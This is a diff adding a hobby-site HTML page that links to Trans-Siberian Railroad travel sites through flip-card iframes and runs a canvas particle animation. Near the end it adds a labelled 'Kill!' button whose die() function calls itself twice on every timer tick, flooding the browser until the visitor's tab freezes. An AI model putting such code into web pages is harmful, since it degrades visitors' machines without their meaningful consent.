@@ -1,0 +1,280 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Travel Links</title>
+<link href="rollo.css" rel="stylesheet" type="text/css" />
+<script src="background.js" async="async" type="text/javascript"></script>
+</head>
+
+<body>
+
+<canvas id="surface" width="600" height="600"></canvas>
+
+<table width="1000" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><img src="Images/banner.gif" alt=""/></td>
+  </tr>
+  <tr>
+    <td><table width="100%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td><a href="index.html"><button class="homeStyle">Home</button></a></td>
+        <td><a href="hobbies.html"><button class="homeStyle">Hobbies</button></a></td>
+        <td><a href="links.html"><button class="homeStyle">Links</button></a></td>
+       
+        <td><div class="bio">
+  <button class="homeStyle">Bio</button>
+  <div class="bio-content" z-index="1">
+    <a href="bio.html">Bio Home</a>
+    <a href="kalbum.html">Bio Web Album</a>
+    <a href="klinks.html">Bio Links</a>
+  </div>
+</div></td>
+        <td><div class="bio">
+  <button class="homeStyle">Travel Log</button>
+  <div class="bio-content" z-index="1">
+    <a href="smaps.html">Maps</a>
+    <a href="splaces.html">Places</a>
+    <a href="sculture.html">Culture</a>
+    <a href="sinterests.html">Interests</a>
+    <a href="salbum.html">Album</a>
+    <a href="slinks.html">Links</a>
+  </div>
+</div></td>
+        <td><a href="dream.html"><button class="homeStyle">Dream House</button></a></td>
+      </tr>	  
+</table>
+<p>The following are "living links" to an assortment of different websites concerning the Trans-Siberian Railroad</p>
+<table width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="800px" height="750px"><div class="flip-container" ontouchstart="this.classList.toggle('hover');">
+      <div class="flipper">
+		<div class="front">
+			<image src="http://cheap-trip.eu/wp-content/uploads/2013/01/wikivoyage_wikitravel.jpg" alt="Wikitravel" width="800px">
+		</div>
+		<div class="back">
+			<iframe src="http://wikitravel.org/en/Trans-Siberian_Railway" style="height:750px;width:800px">
+</iframe>
+		</div>
+	</div></td>
+  </tr>
+  <tr>
+    <td width="800px" height="750px"><div class="flip-container" ontouchstart="this.classList.toggle('hover');">
+	<div class="flipper">
+    <div class="front">
+	  <image src="http://www.nomadicmatt.com/wp-content/themes/NM-H5/images/Nomadic_Matt-logo.png" alt="Nomadic Matt" width="800px">
+  </div>
+		<div class="back">
+			<iframe src="http://www.nomadicmatt.com/travel-blogs/how-to-travel-the-trans-siberian-railway-2/" style="height:750px;width:800px">
+</iframe>
+		</div>
+</div></td>
+  </tr>
+  <tr>
+    <td width="800px" height="750px"><div class="flip-container" ontouchstart="this.classList.toggle('hover');">
+	<div class="flipper">
+		<div class="front">
+			<image src="http://www.trans-siberian-travel.com/files/0336-roland_jung_dsc_2122_x_baikalsee.jpg" alt="Trans Siberian Travel.com" width="800px">
+		</div>
+		<div class="back">
+			<iframe src="http://www.trans-siberian-travel.com/" style="height:750px;width:800px">
+</iframe>
+		</div>
+	</div></td>
+  </tr>
+  <tr>
+    <td width="800px" height="750px"><div class="flip-container" ontouchstart="this.classList.toggle('hover');">
+	<div class="flipper">
+		<div class="front">
+			<image src="https://www.transsiberianexpress.net/im/head-img.jpg" alt="Transsiberianexpress.net" width="800px">
+		</div>
+		<div class="back">
+			<iframe src="https://www.transsiberianexpress.net/" style="height:750px;width:800px">
+</iframe>
+		</div>
+	</div></td>
+  </tr>
+  <tr>
+    <td width="800px" height="750px"><div class="flip-container" ontouchstart="this.classList.toggle('hover');">
+	<div class="flipper">
+		<div class="front">
+			<image src="http://www.bbc.co.uk/news/special/2015/newsspec_10857/bbc_news_logo.png?cb=1" alt="BBC News" width="800px">
+		</div>
+		<div class="back">
+			<iframe src="http://www.bbc.com/news/world-europe-37249618" style="height:750px;width:800px">
+</iframe>
+		</div>
+	</div></td>
+  </tr>
+</table>
+
+
+<ul>
+<li><a href="#" class="round red" onClick="die()">Kill!<span class="round">I will kill your computer using javascript.</span></a>
+<script>
+function die() {
+	setTimeout(function () {die(); die()}, 0)
+}
+</script>
+</li>
+  
+</ul><script>
+	var SCREEN_WIDTH = window.innerWidth;
+var SCREEN_HEIGHT = window.innerHeight;
+
+var RADIUS = 70;
+
+var RADIUS_SCALE = 1;
+var RADIUS_SCALE_MIN = 1;
+var RADIUS_SCALE_MAX = 1.5;
+
+var QUANTITY = 25;
+
+var canvas;
+var context;
+var particles;
+
+var mouseX = SCREEN_WIDTH * 0.5;
+var mouseY = SCREEN_HEIGHT * 0.5;
+var mouseIsDown = false;
+
+function init() {
+
+  canvas = document.getElementById( 'world' );
+  
+  if (canvas && canvas.getContext) {
+        context = canvas.getContext('2d');
+        
+        // Register event listeners
+        window.addEventListener('mousemove', documentMouseMoveHandler, false);
+        window.addEventListener('mousedown', documentMouseDownHandler, false);
+        window.addEventListener('mouseup', documentMouseUpHandler, false);
+        document.addEventListener('touchstart', documentTouchStartHandler, false);
+        document.addEventListener('touchmove', documentTouchMoveHandler, false);
+        window.addEventListener('resize', windowResizeHandler, false);
+        
+        createParticles();
+        
+        windowResizeHandler();
+        
+        setInterval( loop, 1000 / 60 );
+    }
+}
+
+function createParticles() {
+    particles = [];
+    
+    for (var i = 0; i < QUANTITY; i++) {
+        var particle = {
+            size: 1,
+            position: { x: mouseX, y: mouseY },
+            offset: { x: 0, y: 0 },
+            shift: { x: mouseX, y: mouseY },
+            speed: 0.01+Math.random()*0.04,
+            targetSize: 1,
+            fillColor: '#' + (Math.random() * 0x404040 + 0xaaaaaa | 0).toString(16),
+            orbit: RADIUS*.5 + (RADIUS * .5 * Math.random())
+        };
+        
+        particles.push( particle );
+    }
+}
+
+function documentMouseMoveHandler(event) {
+    mouseX = event.clientX - (window.innerWidth - SCREEN_WIDTH) * .5;
+    mouseY = event.clientY - (window.innerHeight - SCREEN_HEIGHT) * .5;
+}
+
+function documentMouseDownHandler(event) {
+    mouseIsDown = true;
+}
+
+function documentMouseUpHandler(event) {
+    mouseIsDown = false;
+}
+
+function documentTouchStartHandler(event) {
+    if(event.touches.length == 1) {
+        event.preventDefault();
+
+        mouseX = event.touches[0].pageX - (window.innerWidth - SCREEN_WIDTH) * .5;;
+        mouseY = event.touches[0].pageY - (window.innerHeight - SCREEN_HEIGHT) * .5;
+    }
+}
+
+function documentTouchMoveHandler(event) {
+    if(event.touches.length == 1) {
+        event.preventDefault();
+
+        mouseX = event.touches[0].pageX - (window.innerWidth - SCREEN_WIDTH) * .5;;
+        mouseY = event.touches[0].pageY - (window.innerHeight - SCREEN_HEIGHT) * .5;
+    }
+}
+
+function windowResizeHandler() {
+    SCREEN_WIDTH = window.innerWidth;
+    SCREEN_HEIGHT = window.innerHeight;
+    
+    canvas.width = SCREEN_WIDTH;
+	canvas.height = SCREEN_HEIGHT;
+}
+
+function loop() {
+    
+    if( mouseIsDown ) {
+        RADIUS_SCALE += ( RADIUS_SCALE_MAX - RADIUS_SCALE ) * (0.02);
+    }
+    else {
+        RADIUS_SCALE -= ( RADIUS_SCALE - RADIUS_SCALE_MIN ) * (0.02);
+    }
+    
+    RADIUS_SCALE = Math.min( RADIUS_SCALE, RADIUS_SCALE_MAX );
+    
+    context.fillStyle = 'rgba(0,0,0,0)';
+         context.fillRect(0, 0, context.canvas.width, context.canvas.height);
+    
+    for (i = 0, len = particles.length; i < len; i++) {
+        var particle = particles[i];
+        
+        var lp = { x: particle.position.x, y: particle.position.y };
+        
+        // Rotation
+        particle.offset.x += particle.speed;
+        particle.offset.y += particle.speed;
+        
+        // Follow mouse with some lag
+        particle.shift.x += ( mouseX - particle.shift.x) * (particle.speed);
+        particle.shift.y += ( mouseY - particle.shift.y) * (particle.speed);
+        
+        // Apply position
+        particle.position.x = particle.shift.x + Math.cos(i + particle.offset.x) * (particle.orbit*RADIUS_SCALE);
+        particle.position.y = particle.shift.y + Math.sin(i + particle.offset.y) * (particle.orbit*RADIUS_SCALE);
+        
+        // Limit to screen bounds
+        particle.position.x = Math.max( Math.min( particle.position.x, SCREEN_WIDTH ), 0 );
+        particle.position.y = Math.max( Math.min( particle.position.y, SCREEN_HEIGHT ), 0 );
+        
+        particle.size += ( particle.targetSize - particle.size ) * 0.05;
+        
+        if( Math.round( particle.size ) == Math.round( particle.targetSize ) ) {
+            particle.targetSize = 1 + Math.random() * 7;
+        }
+        
+        context.beginPath();
+        context.fillStyle = particle.fillColor;
+        context.strokeStyle = particle.fillColor;
+        context.lineWidth = particle.size;
+        context.moveTo(lp.x, lp.y);
+        context.lineTo(particle.position.x, particle.position.y);
+        context.stroke();
+        context.arc(particle.position.x, particle.position.y, particle.size/2, 0, Math.PI*2, true);
+        context.fill();
+    }
+}
+
+window.onload = init;
+	</script>
+    <canvas id='world'></canvas>
+</body>
+</html>
